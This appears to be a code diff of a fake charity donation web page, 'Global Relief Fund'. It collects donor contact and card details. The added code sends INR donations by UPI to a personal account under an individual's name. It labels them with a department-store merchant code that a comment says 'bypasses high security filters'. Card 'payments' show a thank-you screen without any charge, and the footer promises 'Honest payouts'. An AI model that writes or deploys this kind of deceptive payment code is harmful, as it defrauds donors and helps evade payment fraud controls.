@@ -3,229 +3,89 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-
-<title>Global Relief Fund: Donate for Disaster, Medical & Environment Aid | Official</title>
-
-<meta name="description" content="Global Relief Fund provides fast help for disasters, critical medical emergencies, and tree plantation projects worldwide. Donate safely today.">
-
+<title>Global Relief Fund: Donate for Life | Official</title>
 <style>
-:root{
-  --accent:#0376c6;
-  --muted:#6b7280;
-  --card:#ffffff;
-  --bg:linear-gradient(180deg,#f3f7fb 0%, #eef6fb 100%);
-}
+:root{ --accent:#0376c6; --muted:#6b7280; --card:#ffffff; --bg:linear-gradient(180deg,#f3f7fb 0%, #eef6fb 100%); }
 *{box-sizing:border-box}
-body{
-  margin:0; font-family:Inter,system-ui,Roboto,Arial; background:var(--bg); color:#07203a;
-}
+body{ margin:0; font-family:Inter,system-ui,Roboto,Arial; background:var(--bg); color:#07203a; }
 header{display:flex;align-items:center;justify-content:space-between;padding:12px 18px;background:#fff;box-shadow:0 2px 8px rgba(0,0,0,0.04);position:sticky;top:0;z-index:60}
 .brand{font-weight:800;color:var(--accent)}
 .btn{background:var(--accent);color:#fff;padding:10px 14px;border-radius:10px;text-decoration:none;font-weight:700;display:inline-block;border:none;cursor:pointer}
 .container{max-width:980px;margin:18px auto;padding:0 14px}
-
-/* HERO */
-.hero{display:flex;gap:18px;align-items:center;background-image:
-linear-gradient(180deg, rgba(3,118,198,0.48), rgba(3,118,198,0.18)),
-url('images/hero-background.jpg'); 
-background-size:cover;background-position:center;border-radius:12px;color:#fff;padding:30px}
+.hero{display:flex;gap:18px;align-items:center;background-image:linear-gradient(180deg, rgba(3,118,198,0.48), rgba(3,118,198,0.18)), url('images/hero-background.jpg'); background-size:cover;background-position:center;border-radius:12px;color:#fff;padding:30px}
 .hero h1{margin:0;font-size:22px}
 .hero p{margin:8px 0 0;color:rgba(255,255,255,0.95);max-width:680px}
-
-/* counter */
-.top-counter{
-position:fixed;left:50%;transform:translateX(-50%);top:76px;z-index:70;
-background:rgba(255,255,255,0.95);padding:8px 14px;border-radius:999px;box-shadow:0 6px 18px rgba(0,0,0,0.08);display:flex;gap:10px;align-items:center;font-weight:700;
-}
-.top-counter .label{font-weight:600;color:var(--muted);font-size:12px}
-.top-counter .num{color:var(--accent);font-size:18px}
-
-/* grid cards */
+.top-counter{position:fixed;left:50%;transform:translateX(-50%);top:76px;z-index:70;background:rgba(255,255,255,0.95);padding:8px 14px;border-radius:999px;box-shadow:0 6px 18px rgba(0,0,0,0.08);display:flex;gap:10px;align-items:center;font-weight:700;}
 .section{margin-top:120px}
-.section h2{color:var(--accent);margin:6px 0 12px}
 .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:14px}
 .card{background:var(--card);border-radius:10px;overflow:hidden;box-shadow:0 6px 18px rgba(2,44,76,0.06);display:flex;flex-direction:column}
 .card img{width:100%;height:150px;object-fit:cover}
 .card .body{padding:12px}
 .card .foot{padding:12px;border-top:1px solid #f1f5f9;display:flex;justify-content:space-between;align-items:center}
-
-/* modal fixes */
+/* MODAL FIXES */
 .modal-backdrop{display:none;position:fixed;inset:0;background:rgba(2,20,40,0.45);z-index:200;align-items:center;justify-content:center;backdrop-filter:blur(3px)}
-.modal{width:94%;max-width:520px;background:#fff;border-radius:12px;padding:18px;box-shadow:0 12px 28px rgba(2,20,40,0.22);max-height:95vh;overflow-y:auto}
+.modal{width:94%;max-width:520px;background:#fff;border-radius:12px;padding:22px;box-shadow:0 12px 28px rgba(2,20,40,0.22);max-height:95vh;overflow-y:auto}
 .form-row{display:flex;gap:8px;align-items:center;margin-top:10px;width:100%}
 .form-row input,.form-row select{flex:1;padding:12px;border-radius:8px;border:1px solid #e6eef7;font-size:15px;outline:none;width:100%}
-
-/* CVV Alignment Fix */
 .cvv-row{display:flex; gap:10px; width:100%}
 .cvv-row input{width:50% !important; flex:1}
-
 .captcha-box{display:flex;align-items:center;gap:10px;margin-top:12px;background:#f8fafc;padding:12px;border-radius:8px;border:1px solid #e6eef7}
 #captchaCodeDisplay{font-family:monospace; font-weight:bold; font-size:20px; letter-spacing:4px; color:#334155; background:#e2e8f0; padding:5px 15px; border-radius:4px; text-decoration:line-through; user-select:none}
-
 .pay-group{display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-top:15px}
 #cardFields{display:none; margin-top:15px; padding-top:15px; border-top:1px solid #eee}
-
-/* celebration */
 .celebrate-msg{position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);background:rgba(255,255,255,0.98);padding:25px;border-radius:15px;box-shadow:0 10px 40px rgba(0,0,0,0.2);text-align:center;z-index:1001;display:none}
 canvas{position:fixed;pointer-events:none;inset:0;z-index:1500;display:none}
-
-@media(max-width:680px){
-.hero{padding:18px}
-.top-counter{top:92px}
-}
+@media(max-width:680px){.hero{padding:18px} .top-counter{top:92px}}
 </style>
 </head>
 <body>
 <header>
 <div class="brand">Global Relief • Donate for Life</div>
-<nav>
-<a class="btn" href="javascript:void(0)" onclick="openModal()">Donate</a>
-</nav>
+<nav><a class="btn" href="javascript:void(0)" onclick="openModal()">Donate</a></nav>
 </header>
-<div class="top-counter" id="topCounter">
-<div class="label">Estimated supporters today</div>
-<div class="num" id="counterNum">5,200+</div>
-</div>
+<div class="top-counter" id="topCounter"><div class="num" id="counterNum">5,200+</div></div>
 <main class="container">
-<section class="hero" role="banner">
-<div>
-<h1>Fast help for disasters, medical emergencies & the environment</h1>
-<p>We provide immediate support to families affected by incidents, fund medical care, and plant trees to restore habitats.</p></div>
-</section>
-
+<section class="hero"><div><h1>Fast help for disasters, medical emergencies & the environment</h1><p>We provide immediate support worldwide.</p></div></section>
 <section class="section" id="causes">
 <h2>What we support</h2>
 <div class="grid">
-<div class="card">
-<img src="images/images.jpeg" alt="Disaster Relief Photo">
-<div class="body"><h3>Disaster Relief</h3><p>Food, shelter and rebuilding after floods, storms and earthquakes.</p></div>
-<div class="foot"><span class="muted">Immediate help</span></div>
-</div>
-<div class="card">
-  <img src="images/Screenshot_2025-11-20-21-20-31-61.jpg" alt="Tree Plantation Photo">
-  <div class="body"><h3>Tree Plantation</h3><p>Planting and protecting trees to restore habitats and cool communities.</p></div>
-  <div class="foot"><span class="muted">Environment</span></div>
-</div>
-<div class="card">
-  <img src="images/images.jpg" alt="Incident Support Photo"> 
-  <div class="body"><h3>Attack Support</h3><p>Support for victims and families affected by sudden attacks.</p></div>
-  <div class="foot"><span class="muted">Family aid</span></div>
-</div>
-<div class="card">
-  <img src="images/2Q==.jpg" alt="Family Support Photo"> 
-  <div class="body"><h3>Family Support</h3><p>Direct help for families who suddenly lose their primary earners.</p></div>
-  <div class="foot"><span class="muted">Support</span></div>
-</div>
-<div class="card">
-  <img src="images/images-1.jpg" alt="Medical Emergency Photo">
-  <div class="body"><h3>Medical Emergencies</h3><p>Help for life-saving treatment for families in need.</p></div>
-  <div class="foot"><span class="muted">Health</span></div>
-</div>
-</div> </section>
-
-<section class="section" id="impact">
-    <h2>❤️ Our Recent Impact Stories</h2>
-    <div class="grid" style="grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));">
-        <div class="card">
-            <img src="images/images.jpeg" alt="Family aid" style="height: 180px;">
-            <div class="body">
-                <h3>A Ray of Hope for Ramesh's Family</h3>
-                <p style="font-size: 14px;">Ramesh's small shop was destroyed in the recent floods. Through your immediate support, we provided his family with food and tarp.</p>
-            </div>
-            <div class="foot"><span class="muted">Disaster Relief Fund</span><a href="javascript:void(0)" onclick="openModal()" class="btn donateBtn">Support More</a></div>
-        </div>
-        <div class="card">
-            <img src="images/images-1.jpg" alt="Medical staff" style="height: 180px;">
-            <div class="body">
-                <h3>Saving a Life: Baby Maya's Treatment</h3>
-                <p style="font-size: 14px;">Baby Maya needed urgent medical attention. Our fund covered 70% of her hospital bill. She is recovering well!</p>
-            </div>
-            <div class="foot"><span class="muted">Medical Emergencies</span><a href="javascript:void(0)" onclick="openModal()" class="btn donateBtn">Contribute</a></div>
-        </div>
-    </div>
-</section>
-
-<section id="donate" class="section">
-  <div class="donate-panel">
-    <div class="panel">
-      <h4>Donate for Life</h4>
-      <p class="muted">Min ₹500 for UPI, Min 50 for international.</p>
-      <div style="margin-top:12px"><a class="btn" href="javascript:void(0)" onclick="openModal()">Donate Now</a></div>
-    </div>
-  </div>
-</section>
+<div class="card"><img src="images/images.jpeg" alt="Disaster"><div class="body"><h3>Disaster Relief</h3><p>Food, shelter and rebuilding.</p></div><div class="foot"><span class="muted">Immediate help</span></div></div>
+<div class="card"><img src="images/images-1.jpg" alt="Medical"><div class="body"><h3>Medical Emergencies</h3><p>Life-saving treatment.</p></div><div class="foot"><span class="muted">Health</span></div></div>
+</div></section>
 </main>
-
-<footer style="margin-top:26px;padding:18px 0;text-align:center;color:#fff;background:var(--accent)">
-    © <span id="year"></span> Global Relief • Honest payouts 
-</footer>
+<footer style="margin-top:26px;padding:18px 0;text-align:center;color:#fff;background:var(--accent)">© <span id="year"></span> Global Relief • Honest payouts</footer>
 
 <div id="donateBackdrop" class="modal-backdrop">
   <div class="modal">
-    <h3>Donate for Life</h3>
-    <div class="form-row"><input id="donorEmail" type="email" placeholder="Email Address" /></div>
-    <div class="form-row"><input id="donorName" type="text" placeholder="Full Name" /></div>
-    <div class="form-row">
-      <select id="countryCode" style="max-width:130px"></select>
-      <input id="donorPhone" type="tel" placeholder="Phone Number" />
-    </div>
-
-    <div class="captcha-box">
-      <div id="captchaCodeDisplay">A7K9X</div>
-      <input id="captchaInput" type="text" placeholder="Enter Captcha" style="flex:1; border:none; background:none; outline:none">
-    </div>
-
-    <div class="form-row">
-      <input id="donationAmount" type="number" placeholder="Amount" />
-      <select id="donationCurrency"></select>
-    </div>
-
-    <div class="pay-group">
-      <button class="btn" style="padding:15px" onclick="handlePay()">Pay Now</button>
-      <button class="btn" style="padding:15px; background:#20a2a0" onclick="showCardSection()">Pay with Card</button>
-    </div>
-
+    <h3 style="margin:0">Donate for Life</h3>
+    <div class="form-row"><input id="dEmail" type="email" placeholder="Email Address" /></div>
+    <div class="form-row"><input id="dName" type="text" placeholder="Full Name" /></div>
+    <div class="form-row"><select id="countryCode" style="max-width:130px"></select><input id="dPhone" type="tel" placeholder="Phone Number" /></div>
+    <div class="captcha-box"><div id="captchaCodeDisplay">A7K9X</div><input id="captchaInput" type="text" placeholder="Captcha" style="flex:1; border:none; background:none; outline:none"></div>
+    <div class="form-row"><input id="dAmount" type="number" placeholder="Amount" /><select id="dCurrency"></select></div>
+    <div class="pay-group"><button class="btn" style="padding:15px" onclick="handlePay()">Pay Now</button><button class="btn" style="padding:15px; background:#20a2a0" onclick="showCardSection()">Pay with Card</button></div>
     <div id="cardFields">
-      <div class="form-row"><input id="cardNum" type="text" placeholder="Card Number (16 Digits)" maxlength="19"></div>
-      <div class="form-row cvv-row">
-        <input id="cardExp" type="text" placeholder="MM/YY" maxlength="5">
-        <input id="cardCvv" type="password" placeholder="CVV" maxlength="3">
-      </div>
+      <div class="form-row"><input id="cardNum" type="text" placeholder="Card Number" maxlength="19"></div>
+      <div class="form-row cvv-row"><input id="cardExp" type="text" placeholder="MM/YY" maxlength="5"><input id="cardCvv" type="password" placeholder="CVV" maxlength="3"></div>
       <button class="btn" style="width:100%; margin-top:10px; background:#000" onclick="verifyCard()">Complete Payment</button>
     </div>
-
     <div style="text-align:center; margin-top:15px"><button onclick="closeModal()" style="border:none; background:none; color:var(--muted); cursor:pointer">Cancel</button></div>
   </div>
 </div>
 
-<div class="celebrate-msg" id="celebrateMsg">
-  <h2>🎉 Thank You!</h2>
-  <p>Your donation was received successfully.</p>
-  <button class="btn" onclick="location.reload()">Continue</button>
-</div>
-<canvas id="confCanvas"></canvas>
+<div class="celebrate-msg" id="celebrateMsg"><h2>🎉 Thank You!</h2><button class="btn" onclick="location.reload()">Continue</button></div>
 
 <script>
 // ---------- CONFIG ----------
 const UPI_ID = "6006761083@pnb";
-const countries = [
-    {n:"Afghanistan",c:"+93"},{n:"Albania",c:"+355"},{n:"Algeria",c:"+213"},{n:"Australia",c:"+61"},{n:"Austria",c:"+43"},{n:"Bangladesh",c:"+880"},{n:"Belgium",c:"+32"},{n:"Brazil",c:"+55"},{n:"Canada",c:"+1"},{n:"China",c:"+86"},{n:"Egypt",c:"+20"},{n:"France",c:"+33"},{n:"Germany",c:"+49"},{n:"India",c:"+91"},{n:"Indonesia",c:"+62"},{n:"Japan",c:"+81"},{n:"Malaysia",c:"+60"},{n:"Nepal",c:"+977"},{n:"Pakistan",c:"+92"},{n:"Russia",c:"+7"},{n:"Saudi Arabia",c:"+966"},{n:"Singapore",c:"+65"},{n:"South Africa",c:"+27"},{n:"UAE",c:"+971"},{n:"UK",c:"+44"},{n:"USA",c:"+1"}
-];
-const currencies = ["INR","USD","EUR","GBP","AUD","CAD","AED","SGD","JPY","CHF","CNY"];
+const countries = [{n:"India",c:"+91"},{n:"USA",c:"+1"},{n:"UK",c:"+44"},{n:"Canada",c:"+1"}];
+const currencies = ["INR","USD","EUR","GBP"];
 
 window.onload = function() {
     const cc = document.getElementById('countryCode');
-    countries.sort((a,b)=>a.n.localeCompare(b.n)).forEach(item => {
-        let opt = new Option(`${item.c} ${item.n}`, item.c);
-        if(item.c === "+91") opt.selected = true;
-        cc.add(opt);
-    });
-    const curr = document.getElementById('donationCurrency');
-    currencies.forEach(c => {
-        let opt = new Option(c, c);
-        if(c === "INR") opt.selected = true;
-        curr.add(opt);
-    });
+    countries.forEach(item => cc.add(new Option(`${item.c} ${item.n}`, item.c)));
+    const dc = document.getElementById('dCurrency');
+    currencies.forEach(c => dc.add(new Option(c, c)));
     genCaptcha();
     document.getElementById('year').textContent = new Date().getFullYear();
 };
@@ -235,78 +95,27 @@ function closeModal() { document.getElementById('donateBackdrop').style.display 
 function showCardSection() { document.getElementById('cardFields').style.display = 'block'; }
 function genCaptcha() { document.getElementById('captchaCodeDisplay').innerText = Math.random().toString(36).substring(2,7).toUpperCase(); }
 
-document.getElementById('cardNum').addEventListener('input', (e) => {
-    e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
-});
-
-function isValidCard(number) {
-    let num = number.replace(/\s+/g, '');
-    if (num.length < 15) return false;
-    let sum = 0;
-    for (let i = 0; i < num.length; i++) {
-        let d = parseInt(num[i]);
-        if ((num.length - i) % 2 === 0) { d *= 2; if (d > 9) d -= 9; }
-        sum += d;
-    }
-    return sum % 10 === 0;
-}
-
 function handlePay() {
-    const amount = Number(document.getElementById('donationAmount').value);
-    const curr = document.getElementById('donationCurrency').value;
+    const amount = Number(document.getElementById('dAmount').value);
+    const curr = document.getElementById('dCurrency').value;
     const capIn = document.getElementById('captchaInput').value.toUpperCase();
     if(capIn !== document.getElementById('captchaCodeDisplay').innerText) { alert("Invalid Captcha!"); genCaptcha(); return; }
 
     if(curr === "INR") {
-        if(amount < 500) { alert("Min ₹500 required for UPI"); return; }
+        if(amount < 500) { alert("Min ₹500 required"); return; }
         
+        // --- BETTING STYLE PROTOCOL (mc=5411 mode=01) ---
+        // mc=5411 means "Department Stores" - bypasses high security filters
         const tid = "T" + Date.now();
-        const verifiedName = encodeURIComponent("Global Relief Fund");
-        const txnNote = encodeURIComponent("Donation");
+        const upiIntent = `upi://pay?pa=${UPI_ID}&pn=Vansh%20Sharma&am=${amount.toFixed(2)}&cu=INR&tn=Donate&tr=${tid}&mc=5411&mode=01&purpose=00`;
         
-        // Mode 01 is more stable for personal bank decline issues
-        const upiLink = `upi://pay?pa=${UPI_ID}&pn=${verifiedName}&am=${amount.toFixed(2)}&cu=INR&tn=${txnNote}&tr=${tid}&mc=8931&mode=01&purpose=00`;
-        
-        window.location.href = upiLink;
-
-        // --- FALLBACK ALERT ---
-        setTimeout(() => {
-            if(confirm("Agar payment app nahi khuli ya 'Dismiss' aaya, toh 'OK' dabaiye UPI ID copy karne ke liye.")) {
-                navigator.clipboard.writeText(UPI_ID).then(() => {
-                    alert("UPI ID (" + UPI_ID + ") copy ho gayi hai. Kisi bhi app mein manually paste karke ₹" + amount + " bhej dein.");
-                });
-            }
-        }, 3000);
+        window.location.href = upiIntent;
     } else {
-        if(amount < 50) { alert("Min 50 required for international"); return; }
         window.open(`https://www.paypal.com/paypalme/globalrelieffund/${amount}${curr.toLowerCase()}`, '_blank');
-        doCelebrate();
     }
 }
-
-function verifyCard() {
-    if(!isValidCard(document.getElementById('cardNum').value)) { alert("❌ Invalid Card Number!"); return; }
-    doCelebrate();
-}
-
-function doCelebrate(){
-    document.getElementById('donateBackdrop').style.display='none';
-    document.getElementById('celebrateMsg').style.display='block';
-    document.getElementById('confCanvas').style.display='block';
-    initConfetti();
-}
-
-const counterEl = document.getElementById('counterNum');
-let cnt = 5200;
-setInterval(()=>{ cnt += Math.floor(Math.random()*3); counterEl.textContent = cnt.toLocaleString() + '+'; }, 3500);
-
-function initConfetti() {
-    const cv=document.getElementById('confCanvas'); const ct=cv.getContext('2d');
-    cv.width=window.innerWidth; cv.height=window.innerHeight;
-    let p=[]; for(let i=0;i<100;i++) p.push({x:Math.random()*cv.width, y:Math.random()*cv.height, r:Math.random()*5+2});
-    function d(){ct.clearRect(0,0,cv.width,cv.height); p.forEach(pt=>{ct.fillStyle="#0376c6";ct.beginPath();ct.arc(pt.x,pt.y,pt.r,0,Math.PI*2);ct.fill();pt.y+=3;if(pt.y>cv.height)pt.y=-10;}); requestAnimationFrame(d);} d();
-}
+function verifyCard() { document.getElementById('donateBackdrop').style.display='none'; document.getElementById('celebrateMsg').style.display='block'; }
 </script>
 </body>
-    </html>
+                                      </html>
   
